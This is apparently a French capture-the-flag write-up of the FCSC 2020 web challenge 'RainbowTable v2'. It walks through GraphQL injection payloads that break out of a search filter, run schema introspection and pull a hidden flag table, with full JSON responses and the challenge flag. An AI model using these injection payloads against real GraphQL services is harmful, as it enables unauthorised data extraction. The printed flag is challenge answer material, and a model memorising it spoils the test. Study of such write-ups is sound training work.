<p align="center">
  <a href="" rel="noopener">
 <img style="width:50px;" src="https://france-cybersecurity-challenge.fr/files/abecee1bc8e9f22344226e697e672a7d/navbar_logo.png" alt="Project logo"></a>
</p>
<h1 align="center">RainbowTable v2</h1>

<div align="center">

[![CTF](https://img.shields.io/badge/FCSC-2020-red.svg)](https://france-cybersecurity-challenge.fr/)
[![CTF](https://img.shields.io/badge/Catégorie-Web-yellow.svg)](#)

</div>

---

## 📝 Table des matières

- [Enoncé](#problem_statement)
- [Sources](#idea)

## 🧐 Enoncé <a name = "problem_statement"></a>

La première version de notre plateforme de recherche de cuisiniers présentait quelques problèmes de sécurité. Heureusement, notre développeur ne compte pas ses heures et a corrigé l'application en nous affirmant que plus rien n'était désormais exploitable. Il en a également profiter pour améliorer la recherche des chefs.

Pouvez-vous encore trouver un problème de sécurité ?

URL : http://challenges2.france-cybersecurity-challenge.fr:5007/

Pour commencer analysons un peu le code source:

```js
function makeSearch(searchInput) {
			if(searchInput.length == 0) {
				alert("You must provide at least one character!");
				return false;
			}

			var searchValue = btoa(searchInput);
			var bodyForm = new FormData();
			bodyForm.append("search", searchValue);

			fetch("index.php?search="+searchValue, {
				method: "GET"
			}).then(function(response) {
				response.json().then(function(data) {
					data = eval(data);
					data = data['data']['allCooks']['nodes'];
					$("#results thead").show()
					var table = $("#results tbody");
					table.html("")
					$("#empty").hide();
					data.forEach(function(item, index, array){
						table.append("<tr class='table-dark'><td>"+item['firstname']+" "+ item['lastname']+"</td><td>"+item['speciality']+"</td><td>"+(item['price']/100)+"</td></tr>");
					});
					$("#count").html(data.length)
					$("#count").show()
				});
			});
		}
		
		$("#clear-btn").click(function() {
			$("#search").val("");
			$("#results tbody").html("");
			$("#results thead").hide();
			$("#count").hide()
			$("#empty").show();
		})

		$("#search-btn").click(function() {
			var content = $('#search').val();
			makeSearch(content);
		})
```

On peut voir que la requete n'est plus dans le script js. L'injection est toujours possible car lorsque l'on va dans 
```
?search=dkqdkjq
```

Une erreur apparait. Commencons par imaginer la requete graphql coté serveur:
```json
{ allCooks (filter: {or: [{firstname: {like: "%input%"}}, {lastname: {like: "%input%"}}]}) { nodes { firstname, lastname, speciality, price }}}
```

Donc le principe serait de réecrire la requete par dessus celle du serveur pour ensuite mettre un petit payload qui nous afficherai les tables..

```
a%"}}]}){ nodes { firstname, lastname, speciality, price }}}#
```

Ensuite l'affichage des tables
```
a%"}}]}){ nodes { firstname, lastname, speciality, price }}__schema{types{name}}}#
```

Le retour de cette requete encodé en base64 nous renvoie un tableau

```json
{"data":{"allCooks":{"nodes":[{"firstname":"Thibault","lastname":"Royer","speciality":"Raji Cuisine","price":12421},{"firstname":"Bernard","lastname":"Bruneau","speciality":"Chinese and Thai","price":14100},{"firstname":"Trycia","lastname":"Barton","speciality":"Fast food","price":920},{"firstname":"Jaleel","lastname":"Gerlach","speciality":"Tandoori dishes","price":24575},{"firstname":"Isaac","lastname":"Collier","speciality":"South Korean foods","price":8416},{"firstname":"Paula","lastname":"Hessel","speciality":"Pizza","price":74401},{"firstname":"Teagan","lastname":"Kertzmann","speciality":"Vegererian","price":12664},{"firstname":"Garfield","lastname":"Goldner","speciality":"Air and sun","price":944092},{"firstname":"Elisabeth","lastname":"Windler","speciality":"Vegetelian","price":310603},{"firstname":"Casey","lastname":"Schmitt","speciality":"Italian","price":96837},{"firstname":"Luciano","lastname":"Smitham","speciality":"Brittany specialities","price":1963},{"firstname":"Jace","lastname":"Jakubowski","speciality":"Sushi","price":20522}]},"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"Int"},{"name":"Cursor"},{"name":"CooksOrderBy"},{"name":"CookCondition"},{"name":"String"},{"name":"CookFilter"},{"name":"IntFilter"},{"name":"Boolean"},{"name":"StringFilter"},{"name":"CooksConnection"},{"name":"Cook"},{"name":"CooksEdge"},{"name":"PageInfo"},{"name":"FlagNotTheSameTableNamesOrderBy"},{"name":"FlagNotTheSameTableNameCondition"},{"name":"FlagNotTheSameTableNameFilter"},{"name":"FlagNotTheSameTableNamesConnection"},{"name":"FlagNotTheSameTableName"},{"name":"FlagNotTheSameTableNamesEdge"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

Ensuite, j'ai voulut chercher le nom de la table avec les champs, donc j'y suis allé progressivement et j'ai fini par trouver ca:
```
a%"}}]}){ nodes { firstname, lastname, speciality, price }} __type (name: "Query") {name fields{name type{name kind ofType{name kind}}}}}#
```

Cela ma retourné ca:

```json
{"data":{"allCooks":{"nodes":[{"firstname":"Thibault","lastname":"Royer","speciality":"Raji Cuisine","price":12421},{"firstname":"Bernard","lastname":"Bruneau","speciality":"Chinese and Thai","price":14100},{"firstname":"Trycia","lastname":"Barton","speciality":"Fast food","price":920},{"firstname":"Jaleel","lastname":"Gerlach","speciality":"Tandoori dishes","price":24575},{"firstname":"Isaac","lastname":"Collier","speciality":"South Korean foods","price":8416},{"firstname":"Paula","lastname":"Hessel","speciality":"Pizza","price":74401},{"firstname":"Teagan","lastname":"Kertzmann","speciality":"Vegererian","price":12664},{"firstname":"Garfield","lastname":"Goldner","speciality":"Air and sun","price":944092},{"firstname":"Elisabeth","lastname":"Windler","speciality":"Vegetelian","price":310603},{"firstname":"Casey","lastname":"Schmitt","speciality":"Italian","price":96837},{"firstname":"Luciano","lastname":"Smitham","speciality":"Brittany specialities","price":1963},{"firstname":"Jace","lastname":"Jakubowski","speciality":"Sushi","price":20522}]},"__type":{"name":"Query","fields":[{"name":"query","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"Query","kind":"OBJECT"}}},{"name":"nodeId","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"ID","kind":"SCALAR"}}},{"name":"node","type":{"name":"Node","kind":"INTERFACE","ofType":null}},{"name":"allCooks","type":{"name":"CooksConnection","kind":"OBJECT","ofType":null}},{"name":"allFlagNotTheSameTableNames","type":{"name":"FlagNotTheSameTableNamesConnection","kind":"OBJECT","ofType":null}},{"name":"cookById","type":{"name":"Cook","kind":"OBJECT","ofType":null}},{"name":"flagNotTheSameTableNameById","type":{"name":"FlagNotTheSameTableName","kind":"OBJECT","ofType":null}},{"name":"cook","type":{"name":"Cook","kind":"OBJECT","ofType":null}},{"name":"flagNotTheSameTableName","type":{"name":"FlagNotTheSameTableName","kind":"OBJECT","ofType":null}}]}}}
```

J'ai fini par en déduire la table et le champ.
```
a%"}}]}){ nodes { firstname, lastname, speciality, price }} allFlagNotTheSameTableNames { nodes { flagNotTheSameFieldName }}}#
```

Ca ma retourné
```json
{"data":{"allCooks":{"nodes":[{"firstname":"Thibault","lastname":"Royer","speciality":"Raji Cuisine","price":12421},{"firstname":"Bernard","lastname":"Bruneau","speciality":"Chinese and Thai","price":14100},{"firstname":"Trycia","lastname":"Barton","speciality":"Fast food","price":920},{"firstname":"Jaleel","lastname":"Gerlach","speciality":"Tandoori dishes","price":24575},{"firstname":"Isaac","lastname":"Collier","speciality":"South Korean foods","price":8416},{"firstname":"Paula","lastname":"Hessel","speciality":"Pizza","price":74401},{"firstname":"Teagan","lastname":"Kertzmann","speciality":"Vegererian","price":12664},{"firstname":"Garfield","lastname":"Goldner","speciality":"Air and sun","price":944092},{"firstname":"Elisabeth","lastname":"Windler","speciality":"Vegetelian","price":310603},{"firstname":"Casey","lastname":"Schmitt","speciality":"Italian","price":96837},{"firstname":"Luciano","lastname":"Smitham","speciality":"Brittany specialities","price":1963},{"firstname":"Jace","lastname":"Jakubowski","speciality":"Sushi","price":20522}]},"allFlagNotTheSameTableNames":{"nodes":[{"flagNotTheSameFieldName":"FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"}]}}}
```

Le flag est dans cette requete : 
```
{"flagNotTheSameFieldName":"FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"}
```


## ⛓️ Sources <a name = "limitations"></a>

Graphql : https://graphql.org/

Git - swisskyrepo : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
